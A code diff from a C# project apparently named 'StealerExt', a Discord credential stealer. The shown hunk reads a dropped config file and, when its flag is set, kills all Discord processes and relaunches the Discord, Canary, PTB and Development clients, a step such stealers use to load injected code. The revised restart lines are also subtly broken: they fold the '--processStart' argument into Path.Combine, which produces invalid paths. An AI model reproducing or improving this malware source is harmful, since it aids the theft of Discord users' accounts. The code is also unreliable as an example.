@@ -98,19 +98,20 @@ namespace StealerExt
                 }
             }
             catch { }
+            
             dynamic config = JsonConvert.DeserializeObject(File.ReadAllText(API.Temp + "config"));
             if ((bool)config.rd == true)
             {
                 try
                 {
                     Process.GetProcesses()
-                        .Where(x => x.ProcessName.StartsWith("Discord", StringComparison.OrdinalIgnoreCase))
+                        .Where(x => x.ProcessName.ToLowerInvariant().StartsWith("discord", StringComparison.OrdinalIgnoreCase))
                         .ToList()
                         .ForEach(x => x.Kill());
-                    if (Discord)Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe", "--processStart Discord.exe");
-                    if (DiscordCan)Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordCanary\\Update.exe", "--processStart DiscordCanary.exe");
-                    if (DiscordPTB)Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordPTB\\Update.exe", "--processStart DiscordPTB.exe");
-                    if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordDevelopment\\Update.exe"))Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordDevelopment\\Update.exe", "--processStart DiscordDevelopment.exe");
+                    if (Discord) Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Discord\\Update.exe", "--processStart Discord.exe"));
+                    if (DiscordCan) Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "DiscordCanary\\Update.exe", "--processStart DiscordCanary.exe"));
+                    if (DiscordPTB) Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "DiscordPTB\\Update.exe", "--processStart DiscordPTB.exe"));
+                    if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "DiscordDevelopment\\Update.exe"))) Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "DiscordDevelopment\\Update.exe", "--processStart DiscordDevelopment.exe"));
                 }
                 catch { }
             }
